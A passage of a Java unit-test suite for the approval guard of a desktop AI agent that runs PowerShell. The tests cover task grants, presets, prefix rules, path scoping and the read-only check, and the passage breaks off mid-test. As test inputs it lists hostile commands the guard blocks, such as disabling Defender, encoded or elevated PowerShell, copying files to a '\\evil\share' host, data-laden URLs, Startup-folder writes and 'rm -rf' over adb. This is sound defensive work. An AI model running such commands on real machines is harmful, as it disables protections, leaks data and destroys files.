package com.onesay.desktop;

import static org.junit.Assert.*;

import java.nio.file.Files;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.TreeMap;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;
import org.junit.After;
import org.junit.Test;

/**
 * [approvals-1118] 电脑端对话审批放宽（用户：「审批太严了… 打开个 bilibili 都要审批」「一个任务点很多次」）：
 * 任务级批准、预设三档、按前缀「以后不用问」、按路径放行、普通网址 / 已装程序直接开、只读判定放宽、
 * 任务没有步数上限、任务进行中的消息不丢、模型伪造步骤文字。
 */
public class Approvals1118Test {

    @After public void reset() {
        PcGuard.LOCAL.set(Boolean.FALSE);
        PcGuard.TASK.set("");
        SafeExec.REMOTE.set(Boolean.FALSE);
        SafeExec.reset(() -> false, null);
    }

    /** 记下每次弹卡；按设定回答（默认「允许本次任务」）。 */
    static final class Card implements PcGuard.Confirmer {
        int answer = PcGuard.TASK_ALLOW;
        final List<String> asked = new ArrayList<>();
        final List<String> kinds = new ArrayList<>();
        final List<Boolean> taskOffered = new ArrayList<>();

        @Override public int ask(String from, String cmd, String detail, long timeoutMs) {
            asked.add(detail);
            kinds.add("");
            taskOffered.add(false);
            return answer == PcGuard.TASK_ALLOW || answer == PcGuard.SESSION_ALLOW ? PcGuard.ALLOW : answer;
        }

        @Override public int ask(String from, String cmd, String detail, long timeoutMs, boolean offerAlways, String rememberKind) {
            asked.add(detail);
            kinds.add(rememberKind);
            taskOffered.add(false);
            return answer == PcGuard.TASK_ALLOW || answer == PcGuard.SESSION_ALLOW ? PcGuard.ALLOW : answer;
        }

        @Override public int ask(String from, String cmd, String detail, long timeoutMs, boolean offerAlways, String rememberKind, boolean offerTask) {
            asked.add(detail);
            kinds.add(rememberKind);
            taskOffered.add(offerTask);
            return answer;
        }
    }

    static Config cfg() throws Exception {
        Config c = new Config(Files.createTempFile("ap", ".properties"));
        c.deviceId = "pc-ap";
        c.pairKey = Protocol.newKey();
        c.workspaceDir = Files.createTempDirectory("apws").toFile().getCanonicalPath(); // 真文件只写临时目录；路径判定用下面的 Windows 环境
        return c;
    }

    static PathScope.Env env(Set<String> existing, Set<String> dirs) {
        PathScope.Env e = new PathScope.Env();
        e.userProfile = "C:\\Users\\me";
        e.temp = "C:\\Users\\me\\AppData\\Local\\Temp";
        e.workspace = "C:\\Users\\me\\OneSay\\workspace";
        e.envVars.put("userprofile", e.userProfile);
        e.envVars.put("temp", e.temp);
        Set<String> ex = new HashSet<>();
        for (String x : existing) ex.add(x.toLowerCase());
        Set<String> ds = new HashSet<>();
        for (String x : dirs) ds.add(x.toLowerCase());
        e.exists = p -> ex.contains(p.toLowerCase()) || ds.contains(p.toLowerCase());
        e.isDir = p -> ds.contains(p.toLowerCase());
        return e;
    }

    static PcGuard guard(Config c, Card card) {
        PcGuard g = new PcGuard(c, card);
        g.pathEnvSource = () -> env(Set.of(), Set.of("C:\\Users\\me\\Desktop", "C:\\Users\\me\\Downloads", "C:\\Users\\me\\Documents"));
        return g;
    }

    static PcGuard.Outcome local(PcGuard g, String task, String cmd, Map<String, Object> args) {
        PcGuard.LOCAL.set(Boolean.TRUE);
        PcGuard.TASK.set(task);
        try {
            return g.check(ChatAgent.FROM, cmd, new TreeMap<>(args));
        } finally {
            PcGuard.LOCAL.set(Boolean.FALSE);
            PcGuard.TASK.set("");
        }
    }

    static PcGuard.Outcome sh(PcGuard g, String task, String command) {
        return local(g, task, "sys_exec", Map.of("command", command));
    }

    static Llm.Turn call(String id, String name, String argsJson) {
        return new Llm.Turn(null, List.of(new Llm.ToolCall(id, name, argsJson)), Llm.msg("assistant", ""));
    }

    static Llm.Turn say(String text) { return new Llm.Turn(text, List.of(), Llm.msg("assistant", text)); }

    static String rc(String desc, String command) {
        return Json.stringify(Map.of("description", desc, "command", command));
    }

    // ------------------------------------------------------------------ 任务级批准：Mindustry → MuMu 至多 1–2 次

    /** A-2 轮真机实测这类任务弹了 34 张卡；现在第一张卡点「允许本次任务」后，同一任务里的下载 / 抓网页 / adb / 启动模拟器都不再问。 */
    @Test public void mindustryToMuMuNeedsAtMostTwoApprovals() throws Exception {
        Card card = new Card();
        PcGuard g = guard(cfg(), card);
        String adb = "& 'C:\\Program Files\\MuMu\\emulator\\MuMuPlayer-12.0\\shell\\adb.exe'";
        String mgr = "& 'C:\\Program Files\\MuMu\\emulator\\MuMuPlayer-12.0\\nx_main\\MuMuManager.exe'";
        List<Llm.Turn> turns = new ArrayList<>(List.of(
                call("1", "run_command", rc("查 MuMu 装在哪", "Get-ChildItem 'C:\\Program Files\\MuMu' -Directory | Select-Object FullName")),
                call("2", "run_command", rc("看模拟器连上没有", adb + " devices")),
                call("3", "run_command", rc("查模拟器状态", mgr + " info -v 0")),
                call("4", "run_command", rc("查最新版本", "$ProgressPreference='SilentlyContinue'; (Invoke-WebRequest -Uri 'https://api.github.com/repos/Anuken/Mindustry/releases/latest' -UseBasicParsing).Content | ConvertFrom-Json | Select-Object tag_name")),
                call("5", "run_command", rc("再看一下下载页", "$ProgressPreference='SilentlyContinue'; $r=Invoke-WebRequest -Uri 'https://anuke.itch.io/mindustry' -UseBasicParsing -TimeoutSec 40; $r.StatusCode")),
                call("6", "run_command", rc("下载安装包", "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'https://github.com/Anuken/Mindustry/releases/download/v146/Mindustry.apk' -OutFile \"$env:USERPROFILE\\Downloads\\Mindustry.apk\"")),
                call("7", "run_command", rc("启动模拟器", mgr + " control -v 0 launch; Start-Sleep -Seconds 40; " + mgr + " info -v 0")),
                call("8", "run_command", rc("连上模拟器", adb + " connect 127.0.0.1:16384; " + adb + " devices")),
                call("9", "run_command", rc("装进模拟器", adb + " -s 127.0.0.1:16384 install -r \"$env:USERPROFILE\\Downloads\\Mindustry.apk\"")),
                call("10", "run_command", rc("打开游戏", adb + " -s 127.0.0.1:16384 shell monkey -p io.anuke.mindustry -c android.intent.category.LAUNCHER 1")),
                call("11", "run_command", rc("截个图看看", adb + " -s 127.0.0.1:16384 exec-out screencap -p > \"$env:USERPROFILE\\Downloads\\mumu.png\"")),
                call("12", "open_target", Json.stringify(Map.of("description", "把模拟器窗口打开", "name", "C:\\Program Files\\MuMu\\MuMuPlayer.exe"))),
                say("装好并打开到主菜单了。")));
        int[] i = {0};
        ChatAgent.Brain b = (m, t) -> turns.get(Math.min(i[0]++, turns.size() - 1));
        List<String> ran = new ArrayList<>();
        ChatAgent.Exec ex = (cmd, args) -> {
            PcGuard.Outcome o = local(g, "task-mindustry", cmd, args);
            if (o.reply != null) return o.reply;
            assertTrue(o.pass.consume(cmd, o.args));
            ran.add(cmd);
            return Actions.Result.ok("命令执行完了", new TreeMap<>(Map.of("output", "ok", "exit", 0L)));
        };
        ChatAgent.Outcome out = new ChatAgent().run(new ArrayList<>(List.of(Llm.msg("system", "s"), Llm.msg("user", "下载 Mindustry 装进 MuMu 并打开"))), b, ex, t -> { });
        assertEquals(out.text, "done", out.status);
        assertEquals("12 步都执行了", 12, ran.size());
        assertTrue("至多 2 次批准，实际 " + card.asked.size() + "：" + card.asked, card.asked.size() <= 2);
        assertTrue("第一张卡给了「允许本次任务」", card.taskOffered.get(0));
    }

    @Test public void taskGrantDoesNotCoverDangerousStepsOrOtherTasks() throws Exception {
        Card card = new Card();
        PcGuard g = guard(cfg(), card);
        assertNotNull(sh(g, "t1", "winget install --id Some.App").pass);
        assertEquals(1, card.asked.size());
        assertNotNull("同一任务：不再问", sh(g, "t1", "winget install --id Other.App").pass);
        assertEquals(1, card.asked.size());
        card.answer = PcGuard.DENY;
        assertNotNull("删除工作区以外的东西：照旧问", sh(g, "t1", "Remove-Item 'D:\\data\\x.txt'").reply);
        assertEquals(2, card.asked.size());
        assertFalse("删除这类卡上不给「允许本次任务」", card.taskOffered.get(1));
        assertNotNull("卸载：照旧问", sh(g, "t1", "winget uninstall Some.App").reply);
        assertNotNull("关机：照旧问", local(g, "t1", "shutdown", Map.of()).reply);
        assertEquals(4, card.asked.size());
        // 新任务：上一个任务的批准不带过来
        g.taskStarted("t2");
        assertNotNull(sh(g, "t2", "winget install --id Third.App").reply);
        assertEquals(5, card.asked.size());
        // 硬规则：任务批准绕不过（根本不弹卡）
        card.answer = PcGuard.TASK_ALLOW;
        g.grantTask("t3");
        PcGuard.Outcome up = sh(g, "t3", "Start-Process powershell -Verb RunAs");
        assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, up.reply.data.get("reason"));
        PcGuard.Outcome adm = sh(g, "t3", "Set-MpPreference -DisableRealtimeMonitoring $true");
        assertNotNull(adm.reply);
        PcGuard.Outcome enc = sh(g, "t3", "powershell -EncodedCommand ZQBjAGgAbwA=");
        assertNotNull(enc.reply);
        assertEquals(5, card.asked.size());
    }

    @Test public void sessionGrantAndSameStepNotReasked() throws Exception {
        Card card = new Card();
        card.answer = PcGuard.ALLOW;
        PcGuard g = guard(cfg(), card);
        String c = "$r=Invoke-WebRequest -Uri 'https://anuke.itch.io/mindustry' -UseBasicParsing; $r.StatusCode";
        assertNotNull(sh(g, "t1", c).pass);
        assertNotNull("完全一样的再来一次：这次运行里不再问", sh(g, "t9", c).pass);
        assertEquals(1, card.asked.size());
        card.answer = PcGuard.SESSION_ALLOW;
        assertNotNull(sh(g, "t1", "winget install --id A.B").pass);
        assertNotNull("这次运行都允许：别的任务也不问", sh(g, "t2", "winget install --id C.D").pass);
        assertEquals(2, card.asked.size());
        g.revokeGrants();
        card.answer = PcGuard.DENY;
        assertNotNull("撤销后再问", sh(g, "t2", "winget install --id E.F").reply);
        assertEquals(3, card.asked.size());
    }

    @Test public void confirmCardScopeOnlyByHumanClickAndOnlyWhenOffered() throws Exception {
        PcGuard.Confirms cf = new PcGuard.Confirms();
        AtomicLong now = new AtomicLong(1_000_000);
        cf.clock = now::get;
        cf.tickMs = 5;
        int[] res = {Integer.MIN_VALUE};
        Thread t = new Thread(() -> res[0] = cf.ask(ChatAgent.FROM, "sys_exec", "d", 60000, false, "", true));
        t.start();
        while (cf.list().isEmpty()) Thread.sleep(5);
        int id = ((Number) ((Map<?, ?>) cf.list().get(0)).get("id")).intValue();
        assertEquals(Boolean.TRUE, ((Map<?, ?>) cf.list().get(0)).get("task_scope"));
        cf.seen(id, true);
        now.addAndGet(ConfirmGate.ARM_MS + 10);
        assertEquals("不是本机鼠标 / 键盘：不算", ConfirmGate.Answer.NOT_LOCAL, cf.answer(id, true, false, false, "task", ConfirmGate.Input.UNKNOWN));
        assertEquals(ConfirmGate.Answer.ACCEPTED, cf.answer(id, true, false, false, "task", ConfirmGate.Input.MOUSE));
        t.join(2000);
        assertEquals(PcGuard.TASK_ALLOW, res[0]);
        // 没给「允许本次任务」的卡：scope 不算数，只算允许一次
        Thread t2 = new Thread(() -> res[0] = cf.ask("phone-x", "sys_exec", "d", 60000, false, "", false));
        t2.start();
        while (cf.list().isEmpty()) Thread.sleep(5);
        int id2 = ((Number) ((Map<?, ?>) cf.list().get(0)).get("id")).intValue();
        cf.seen(id2, true);
        now.addAndGet(ConfirmGate.ARM_MS + 10);
        assertEquals(ConfirmGate.Answer.ACCEPTED, cf.answer(id2, true, false, false, "session", ConfirmGate.Input.KEYBOARD));
        t2.join(2000);
        assertEquals(PcGuard.ALLOW, res[0]);
    }

    // ------------------------------------------------------------------ 预设

    @Test public void presetsReadOnlyDefaultFull() throws Exception {
        Config c = cfg();
        Card card = new Card();
        card.answer = PcGuard.DENY;
        PcGuard g = guard(c, card);
        String mk = "New-Item -ItemType Directory 'C:\\Users\\me\\Desktop\\onesay-test'";
        assertNotNull("默认：桌面新建直接做", sh(g, "t", mk).pass);
        assertTrue(card.asked.isEmpty());
        c.chatPreset = "read_only";
        assertNotNull("只读：问", sh(g, "t", mk).reply);
        assertEquals(1, card.asked.size());
        assertEquals("只读：不给记住", "", card.kinds.get(0));
        assertFalse("只读：不给本次任务", card.taskOffered.get(0));
        assertNotNull("只读：查询照旧直接做", sh(g, "t", "Get-ChildItem C:\\").pass);
        assertNotNull("只读：开网址也问", local(g, "t", "open_url", Map.of("url", "https://www.bilibili.com")).reply);
        c.chatPreset = "full";
        int before = card.asked.size();
        assertNotNull("完全访问：不问", sh(g, "t", "winget install --id X.Y").pass);
        assertNotNull(sh(g, "t", "Remove-Item 'D:\\data\\x.txt'").pass);
        assertEquals(before, card.asked.size());
        assertNotNull("完全访问：硬规则照旧", sh(g, "t", "Start-Process cmd -Verb RunAs").reply);
    }

    @Test public void presetChangeIsToldToTheModel() {
        ChatAgent a = new ChatAgent();
        ChatPolicy.Preset[] p = {ChatPolicy.Preset.DEFAULT};
        a.preset = () -> p[0];
        List<List<Map<String, Object>>> seen = new ArrayList<>();
        AtomicInteger n = new AtomicInteger();
        ChatAgent.Brain b = (m, t) -> {
            seen.add(new ArrayList<>(m));
            if (n.incrementAndGet() == 1) { p[0] = ChatPolicy.Preset.FULL; return call("1", "run_command", rc("看时间", "Get-Date")); }
            return say("好");
        };
        a.run(new ArrayList<>(List.of(Llm.msg("system", "s"), Llm.msg("user", "x"))), b, (c, args) -> Actions.Result.ok("ok"), t -> { });
        String last = String.valueOf(seen.get(1).get(seen.get(1).size() - 1).get("content"));
        assertTrue(last, last.contains("完全访问"));
    }

    // ------------------------------------------------------------------ 网址 / 程序

    @Test public void plainUrlsOpenWithoutAskingRiskyOnesAsk() throws Exception {
        Card card = new Card();
        card.answer = PcGuard.DENY;
        PcGuard g = guard(cfg(), card);
        assertNotNull("打开 bilibili 不用批", local(g, "t", "open_url", Map.of("url", "https://www.bilibili.com/video/BV1xx411c7mD")).pass);
        assertTrue(card.asked.isEmpty());
        for (String bad : new String[] {"file:///C:/Windows/win.ini", "javascript:alert(1)", "bilibili://video/1", "\\\\evil\\share"})
            assertNotNull(bad, local(g, "t", "open_url", Map.of("url", bad)).reply);
        assertTrue("坏网址直接拒，不弹卡", card.asked.isEmpty());
        assertNotNull("带账号密码：问", local(g, "t", "open_url", Map.of("url", "https://user:pw@example.com/")).reply);
        assertNotNull("夹带数据：问", local(g, "t", "open_url", Map.of("url", "https://example.com/?d=" + "QUJD".repeat(40))).reply);
        assertEquals(2, card.asked.size());
        assertEquals("夹带数据的卡可以记住这个域名", "url:example.com", card.kinds.get(1));
        // run_command 里的 Start-Process 网址：改走 open_url
        Object[] rw = LocalLaunch.rewrite("sys_exec", Map.of("command", "Start-Process 'https://www.bilibili.com'"));
        assertEquals("open_url", rw[0]);
        assertNull("自定义协议不改写（照常当命令，要批）", LocalLaunch.rewrite("sys_exec", Map.of("command", "Start-Process bilibili://video/1")));
        assertEquals("open_app", LocalLaunch.rewrite("sys_exec", Map.of("command", "Start-Process 'C:\\Program Files\\MuMu\\MuMuPlayer.exe'"))[0]);
        assertNull("带参数的不改写", LocalLaunch.rewrite("sys_exec", Map.of("command", "Start-Process 'C:\\x\\a.exe' -ArgumentList '-v'")));
        assertTrue(LocalLaunch.notApp("powershell.exe"));
        assertTrue(LocalLaunch.notApp("C:\\Windows\\System32\\cmd.exe"));
        assertFalse(LocalLaunch.notApp("MuMu模拟器"));
        assertNotNull("打开已装程序：不弹卡", local(g, "t", "open_app", Map.of("name", "MuMu模拟器")).pass);
        assertEquals(2, card.asked.size());
    }

    @Test public void openAppResolvesStartMenuButNotShells() throws Exception {
        java.nio.file.Path sm = Files.createTempDirectory("sm");
        Files.createDirectories(sm.resolve("MuMu"));
        Files.writeString(sm.resolve("MuMu").resolve("MuMu模拟器.lnk"), "x");
        Files.writeString(sm.resolve("Windows PowerShell.lnk"), "x");
        Files.writeString(sm.resolve("卸载MuMu.lnk"), "x");
        assertEquals("MuMu模拟器.lnk", LocalLaunch.resolve("MuMu模拟器", "", Map.of(), List.of(sm.toString()), List.of()).getName());
        assertEquals("包含也认", "MuMu模拟器.lnk", LocalLaunch.resolve("MuMu", "", Map.of(), List.of(sm.toString()), List.of()).getName());
        assertNull(LocalLaunch.resolve("Windows PowerShell", "", Map.of(), List.of(sm.toString()), List.of()));
        assertNull("不在安装目录的完整路径不开", LocalLaunch.resolve("", "C:\\Users\\me\\Downloads\\evil.exe", Map.of(), List.of(), List.of("C:\\Program Files")));
    }

    // ------------------------------------------------------------------ 按路径放行

    @Test public void pathScopeAllowsNewFilesInUserFoldersOnly() {
        PathScope.Env e = env(Set.of("C:\\Users\\me\\Documents\\report.docx"), Set.of("C:\\Users\\me\\Desktop", "C:\\Users\\me\\Downloads", "C:\\Users\\me\\Documents"));
        assertTrue(PathScope.analyze("New-Item -ItemType Directory 'C:\\Users\\me\\Desktop\\onesay-test'", e).ok);
        assertTrue(PathScope.analyze("md \"$env:USERPROFILE\\Desktop\\a\"; Set-Content -Path ~\\Desktop\\a\\b.txt -Value 'hi'", e).ok);
        assertTrue("工作区相对路径", PathScope.analyze("New-Item notes.txt -Value 'x'", e).ok);
        assertTrue("临时目录里随便改", PathScope.analyze("Remove-Item -Recurse \"$env:TEMP\\old\"", env(Set.of("C:\\Users\\me\\AppData\\Local\\Temp\\old"), Set.of())).ok);
        assertTrue("'文字' | Out-File", PathScope.analyze("'hello' | Out-File C:\\Users\\me\\Documents\\n.txt", e).ok);
        assertTrue("只读管道 | Out-File", PathScope.analyze("Get-Process | Select-Object Name | Out-File C:\\Users\\me\\Documents\\p.txt", e).ok);
        assertTrue(PathScope.analyze("Expand-Archive C:\\Users\\me\\Downloads\\a.zip -DestinationPath C:\\Users\\me\\Downloads\\a", e).ok);
        assertFalse("覆盖已有的用户文件：不算", PathScope.analyze("Set-Content C:\\Users\\me\\Documents\\report.docx -Value 'x'", e).ok);
        assertFalse("删已有的用户文件：不算", PathScope.analyze("Remove-Item C:\\Users\\me\\Documents\\report.docx", e).ok);
        assertFalse("强制删除：不算（Codex 同款）", PathScope.analyze("Remove-Item -Force \"$env:TEMP\\x\"", e).ok);
        assertFalse("PowerShell 配置文件", PathScope.analyze("New-Item C:\\Users\\me\\Documents\\WindowsPowerShell\\profile.ps1 -Value 'x'", e).ok);
        assertFalse("地盘外", PathScope.analyze("New-Item C:\\Windows\\x.txt", e).ok);
        assertFalse("启动文件夹", PathScope.analyze("New-Item 'C:\\Users\\me\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\x.bat' -Value 'x'", e).ok);
        assertFalse("..跳出", PathScope.analyze("New-Item C:\\Users\\me\\Desktop\\..\\..\\x.txt", e).ok);
        assertFalse("UNC", PathScope.analyze("Copy-Item C:\\a.txt \\\\evil\\share\\a.txt", e).ok);
        assertFalse("通配符", PathScope.analyze("Remove-Item C:\\Users\\me\\AppData\\Local\\Temp\\*", e).ok);
        assertFalse("8.3 短名", PathScope.analyze("New-Item C:\\Users\\me\\DOCUME~1\\x.txt", e).ok);
        assertFalse("备用流", PathScope.analyze("Set-Content C:\\Users\\me\\Desktop\\a.txt:hidden -Value x", e).ok);
        assertFalse("变量", PathScope.analyze("New-Item $p", e).ok);
        assertFalse("子表达式", PathScope.analyze("New-Item \"$(Get-Date)\"", e).ok);
        assertFalse("内容不是字面量", PathScope.analyze("Set-Content C:\\Users\\me\\Desktop\\a.txt -Value $x", e).ok);
        assertFalse("链接", PathScope.analyze("New-Item -ItemType SymbolicLink C:\\Users\\me\\Desktop\\l -Value C:\\Windows", e).ok);
        assertFalse("根目录本身", PathScope.analyze("Remove-Item -Recurse C:\\Users\\me\\OneSay\\workspace", e).ok);
        // 联接点跳出地盘
        PathScope.Env j = env(Set.of(), Set.of("C:\\Users\\me\\Desktop", "C:\\Users\\me\\Desktop\\link"));
        j.real = p -> p.toLowerCase().startsWith("c:\\users\\me\\desktop\\link") ? "C:\\Windows\\System32" + p.substring("C:\\Users\\me\\Desktop\\link".length()) : p;
        assertFalse(PathScope.analyze("New-Item C:\\Users\\me\\Desktop\\link\\x.dll -Value 'x'", j).ok);
    }

    @Test public void sessionCreatedCanBeChangedLater() throws Exception {
        Card card = new Card();
        card.answer = PcGuard.DENY;
        PcGuard g = guard(cfg(), card);
        PcGuard.Outcome mk = sh(g, "t", "New-Item -ItemType Directory 'C:\\Users\\me\\Desktop\\onesay-test'");
        assertNotNull(mk.pass);
        assertEquals(List.of("C:\\Users\\me\\Desktop\\onesay-test"), mk.creates);
        g.noteCreated(mk.creates);
        g.pathEnvSource = () -> env(Set.of("C:\\Users\\me\\Desktop\\onesay-test"), Set.of("C:\\Users\\me\\Desktop", "C:\\Users\\me\\Desktop\\onesay-test"));
        assertNotNull("对话自己建的：删掉不用问", sh(g, "t", "Remove-Item -Recurse 'C:\\Users\\me\\Desktop\\onesay-test'").pass);
        assertTrue(card.asked.isEmpty());
        assertNotNull("别人的：问", sh(g, "t", "Remove-Item 'C:\\Users\\me\\Desktop\\mine.txt'").reply);
        assertEquals(1, card.asked.size());
    }

    @Test public void downloadIntoUserFolderAsksOnceForHostThenRemembers() throws Exception {
        Config c = cfg();
        Card card = new Card();
        card.answer = PcGuard.REMEMBER;
        PcGuard g = guard(c, card);
        String dl = "Invoke-WebRequest https://github.com/a/b/releases/download/v1/x.apk -OutFile C:\\Users\\me\\Downloads\\x.apk";
        assertNotNull(sh(g, "t1", dl).pass);
        assertEquals("net:github.com", card.kinds.get(0));
        assertTrue(c.netAllow.contains("github.com"));
        assertNotNull(sh(g, "t2", "Invoke-WebRequest https://github.com/a/b/releases/download/v1/y.apk -OutFile C:\\Users\\me\\Downloads\\y.apk").pass);
        assertEquals("记住域名后不再问", 1, card.asked.size());
        assertTrue(PathScope.analyze("curl.exe -L -o C:\\Users\\me\\Downloads\\z.zip https://github.com/z.zip", env(Set.of(), Set.of())).ok);
    }

    // ------------------------------------------------------------------ 前缀规则

    @Test public void prefixRulesLikeCodex() throws Exception {
        assertEquals(List.of("winget", "install"), ChatPolicy.suggest("winget install --id Bilibili.Bilibili"));
        assertEquals(List.of("expand-archive"), ChatPolicy.suggest("Expand-Archive a.zip D:\\x"));
        for (String bad : new String[] {"powershell -c x", "cmd /c del x", "python x.py", "Remove-Item x", "del x", "rm -rf x", "iex x", "Start-Process x",
                "winget", "git -c x=y status", "adb shell rm x", "npm run x", "Invoke-WebRequest https://x", "& 'C:\\x.exe'", "a; b", "a | b", "New-Item $x", "reg add HKCU\\x"})
            assertNull(bad, ChatPolicy.suggest(bad));
        List<List<String>> rules = List.of(List.of("winget", "install"), List.of("adb", "install"));
        assertNotNull(ChatPolicy.matches("winget install --id A.B", rules));
        assertNotNull(ChatPolicy.matches("WINGET.exe Install x", rules));
        assertNotNull("后面接只读", ChatPolicy.matches("winget install x | Select-String ok", rules));
        assertNotNull("和只读串", ChatPolicy.matches("winget install x; Get-ChildItem C:\\", rules));
        assertNull("混了别的命令", ChatPolicy.matches("winget install x; Remove-Item y", rules));
        assertNull("变量不按规则", ChatPolicy.matches("winget install $x", rules));
        assertNull("重定向不按规则", ChatPolicy.matches("winget install x > y", rules));
        assertNull("前缀不完整", ChatPolicy.matches("winget upgrade x", rules));
        assertTrue("坏规则不收", ChatPolicy.parseRules("[[\"powershell\"],[\"rm\"],[\"winget\"],[\"winget\",\"install\"]]").size() == 1);
        assertTrue(ChatPolicy.validKey(ChatPolicy.prefixKey(List.of("winget", "install"))));
        assertFalse(ChatPolicy.validKey("prefix:[\"cmd\"]"));
        assertFalse(ChatPolicy.validKey("net:127.0.0.1"));
        // 记住后（管理员会话也行）直接执行
        SafeExec.reset(() -> true, null);
        Config c = cfg();
        Card card = new Card();
        card.answer = PcGuard.REMEMBER;
        PcGuard g = guard(c, card);
        assertNotNull(sh(g, "t1", "winget install --id A.B").pass);
        assertEquals("prefix:[\"winget\",\"install\"]", card.kinds.get(0));
        assertTrue(card.asked.get(0).contains("管理员权限"));
        assertNotNull(sh(g, "t2", "winget install --id C.D").pass);
        assertEquals(1, card.asked.size());
        assertTrue(Config.load(c.file).chatAllowPrefixes.contains("winget"));
        assertTrue(g.forgetRule(ChatPolicy.prefixKey(List.of("winget", "install"))));
        card.answer = PcGuard.DENY;
        assertNotNull("撤销后再问", sh(g, "t3", "winget install --id E.F").reply);
    }

    // ------------------------------------------------------------------ 只读判定放宽

    @Test public void broaderReadOnly() {
        String[] ok = {
                "Get-ChildItem C:\\x | Select-Object Name, @{n='MB';e={[math]::Round($_.Length/1MB,2)}} | Sort-Object MB -Descending",
                "Get-ChildItem C:\\x | Format-Table Name, @{Name=\"Size(MB)\";Expression={$_.Length / 1MB}}",
                "(Get-Item 'C:\\Program Files\\MuMu\\x.exe').VersionInfo.FileVersion",
                "Get-ChildItem C:\\x | Sort-Object { $_.LastWriteTime } | Select-Object -Last 3",
                "Get-NetAdapter | Select-Object Name, Status",
                "Get-ChildItem C:\\a; Get-ChildItem C:\\b",
                "Test-Path 'C:\\Program Files (x86)\\x'",
                "& 'C:\\Program Files\\MuMu\\emulator\\MuMuPlayer-12.0\\shell\\adb.exe' devices",
                "& 'C:\\Program Files\\MuMu\\emulator\\MuMuPlayer-12.0\\nx_main\\MuMuManager.exe' info -v 0",
                "adb shell getprop ro.build.version.release",
                "adb shell pm list packages -3",
                "ipconfig /all", "systeminfo", "winget list", "git status", "java -version",
                "Get-Content C:\\a.json | ConvertFrom-Json | Select-Object name",
        };
        for (String c : ok) assertTrue(c, LocalReadOnly.ok(c));
        String[] no = {
                "Get-Credential", "Get-Clipboard", "Get-Help Get-Item -Online", "Get-WindowsUpdate -Install -AcceptAll",
                "Get-ChildItem x | Select-Object @{n='x';e={Remove-Item y}}", "Get-ChildItem x | Select-Object @{n='x';e={$_.Delete()}}",
                "(Get-Item x).Delete()", "(Remove-Item x).Name", "Get-Item x | Sort-Object { & cmd }",
                "& 'C:\\x\\evil.exe' devices", "adb shell rm -rf /sdcard", "adb install x.apk", "ipconfig /release", "winget install x",
                "git push", "Get-ChildItem x; Remove-Item y", "Select-Object @{n='x';e={$_.Name}} -Wait; Stop-Computer",
        };
        for (String c : no) assertFalse(c, LocalReadOnly.ok(c));
    }

    // ------------------------------------------------------------------ 任务循环

    @Test public void messageDuringRunIsDeliveredWithinOneStepAndStopWorks() {
        ChatAgent a = new ChatAgent();
        List<List<Map<String, Object>>> seen = new ArrayList<>();
        AtomicInteger n = new AtomicInteger();
        List<String> delivered = new ArrayList<>();
        a.delivered = delivered::add;
        ChatAgent.Brain b = (m, t) -> {
            seen.add(new ArrayList<>(m));
            int k = n.incrementAndGet();
            if (k == 1) { a.inbox.add("顺便把版本号也告诉我"); return call("1", "run_command", rc("看版本", "Get-Date")); }
            if (k == 2) return call("2", "run_command", rc("再看", "Get-Date -Format yyyy"));
            return say("好了");
        };
        ChatAgent.Outcome o = a.run(new ArrayList<>(List.of(Llm.msg("system", "s"), Llm.msg("user", "x"))), b, (c, args) -> Actions.Result.ok("ok"), t -> { });
        assertEquals("done", o.status);
        StringBuilder second = new StringBuilder();
        for (Map<String, Object> m : seen.get(1)) second.append(m.get("content"));
        assertTrue("下一步之前就交给了模型", second.toString().contains("顺便把版本号也告诉我"));
        assertEquals(List.of("顺便把版本号也告诉我"), delivered);
        // 「停」：下一步之前停下
        ChatAgent a2 = new ChatAgent();
        ChatAgent.Brain b2 = (m, t) -> { a2.inbox.add("停"); return call("1", "run_command", rc("x", "Get-Date")); };
        assertEquals("stopped", a2.run(new ArrayList<>(List.of(Llm.msg("user", "x"))), b2, (c, args) -> Actions.Result.ok("ok"), t -> { }).status);
        assertTrue(ChatAgent.stopWord("停止。"));
        assertFalse(ChatAgent.stopWord("停一下音乐再继续下载"));
    }

    @Test public void chatSendDuringRunIsQueuedNotBlockedAndNeverDropped() throws Exception {
        Store s = new Store(Files.createTempDirectory("ap").resolve("state.json"));
        Config c = new Config(Files.createTempFile("ap", ".properties"));
        Chat ch = new Chat(c, s, new Main.TestActions(), List::of, x -> { });
        java.util.concurrent.CountDownLatch inStep = new java.util.concurrent.CountDownLatch(1), go = new java.util.concurrent.CountDownLatch(1);
        List<String> modelSaw = new ArrayList<>();
        AtomicInteger n = new AtomicInteger();
        ch.brain = (m, t) -> {
            StringBuilder all = new StringBuilder();
            for (Map<String, Object> x : m) all.append(x.get("content")).append('|');
            modelSaw.add(all.toString());
            int k = n.incrementAndGet();
            if (k == 1) return call("1", "run_command", rc("慢的一步", "Get-Date"));
            return say("做完了");
        };
        ch.pcExec = (cmd, args) -> { inStep.countDown(); try { go.await(); } catch (InterruptedException e) { } return Actions.Result.ok("ok"); };
        Thread t = new Thread(() -> ch.send("帮我做件事情需要好几步才能完成的那种", "text"));
        t.start();
        assertTrue(inStep.await(5, java.util.concurrent.TimeUnit.SECONDS));
        long t0 = System.currentTimeMillis();
        Map<String, Object> q = ch.send("另外再看一下下载文件夹", "text");
        assertTrue("没被卡住", System.currentTimeMillis() - t0 < 1000);
        assertEquals(Boolean.TRUE, q.get("queued"));
        go.countDown();
        t.join(5000);
        assertTrue("下一步就交给模型", modelSaw.get(1).contains("另外再看一下下载文件夹"));
        assertEquals("处理后不再是「已收到」", Boolean.FALSE, s.find("chat", String.valueOf(q.get("id"))).get("queued"));
        Map<String, Object> card = null;
        for (Map<String, Object> m : s.list("chat")) if ("task".equals(m.get("via"))) card = m;
        assertEquals("done", card.get("state"));
        assertEquals("做完了", card.get("answer"));
    }

    @Test public void noProgressAndTimeLimitStopWithAPlainReason() {
        ChatAgent a = new ChatAgent();
        AtomicInteger n = new AtomicInteger();
        ChatAgent.Brain b = (m, t) -> call("c" + n.get(), "run_command", rc("试一下", "Get-Date -Format " + n.incrementAndGet()));
        ChatAgent.Outcome o = a.run(new ArrayList<>(List.of(Llm.msg("user", "x"))), b, (c, args) -> Actions.Result.fail("命令失败（退出码 1）"), t -> { });
        assertEquals("no_progress", o.status);
